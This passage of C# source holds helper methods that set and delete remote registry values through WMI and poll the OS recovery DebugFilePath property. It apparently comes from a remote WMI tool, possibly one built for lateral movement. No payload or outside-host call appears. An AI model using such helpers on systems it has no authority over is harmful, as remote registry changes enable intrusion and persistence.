                    return "REG_BINARY";
                case regDword:
                    return "REG_DWORD";
                case regMultiSz:
                    return "REG_MULTI_SZ";
            }
            return null;
        }

        public bool SetRegistry(string regMethod, uint defKey, string regSubKey, string regSubKeyValue, string data, ManagementClass mc)
        {
            // Block to be used to set the registry for specific values
            ManagementBaseObject inParamsSet = mc.GetMethodParameters(regMethod);
            inParamsSet["hDefKey"] = defKey;
            inParamsSet["sSubKeyName"] = regSubKey;
            inParamsSet["sValueName"] = regSubKeyValue;

            switch (regMethod)
            {
                // Need diff values for different methods
                case "SetStringValue":
                    inParamsSet["sValue"] = data;
                    break;
                case "SetDWORDValue":
                    inParamsSet["uValue"] = data;
                    break;
            }

            ManagementBaseObject outParamsSet = mc.InvokeMethod(regMethod, inParamsSet, null);

            if (outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0)
                return true;
            
            Messenger.ErrorMessage("[-] Error modifying key");
            Console.WriteLine("\nFull key provided: " + regSubKey + "\n" + "Value provided: " + regSubKeyValue);
            return false;
        }

        public bool DeleteRegistry(uint defKey, string regSubKey, string regSubKeyValue, ManagementClass mc)
        {
            // Block to be used to set the registry for specific values
            ManagementBaseObject inParamsSet = mc.GetMethodParameters("DeleteValue");
            inParamsSet["hDefKey"] = defKey;
            inParamsSet["sSubKeyName"] = regSubKey;
            inParamsSet["sValueName"] = regSubKeyValue;

            ManagementBaseObject outParamsSet = mc.InvokeMethod("DeleteValue", inParamsSet, null);

            if (outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0)
                return true;
            
            Messenger.ErrorMessage("[-] Error deleting key");
            Console.WriteLine("\nFull key provided: " + regSubKey + "\n" + "Value provided: " + regSubKeyValue);
            return false;
        }

        public void CheckForFinishedDebugFilePath(string originalWmiProperty, ManagementScope scoper)
        {
            bool breakLoop = false;
            bool warn = false;
            int counter = 0;
            do
            {
                string modifiedRecovery = GetOsRecovery(scoper);
                if (modifiedRecovery == originalWmiProperty)
                {
                    Messenger.WarningMessage("DebugFilePath write not completed, sleeping for 10s...");
                    Thread.Sleep(10000);
                    warn = true;
                    counter++;
                    if (counter > 12)
                    {
                        // We only want to run for 2 mins max
                        breakLoop = true;
                    }
                }
                else
                {
                    if (warn == true) //I only want this if the warning gets thrown so it stays pretty
                        Console.WriteLine("\n\n");
                    breakLoop = true;
                }
            }
            while (breakLoop == false);
        }

        public bool IsNullOrEmpty(Array array)
        {
            return (array == null || array.Length == 0);
        }

        public string Truncate(string value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return value;
            return value.Length <= maxLength ? value : value.Substring(0, maxLength);
        }

        // Borrowed from https://stackoverflow.com/a/1344242
        private static readonly Random Random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
        }
    }
}

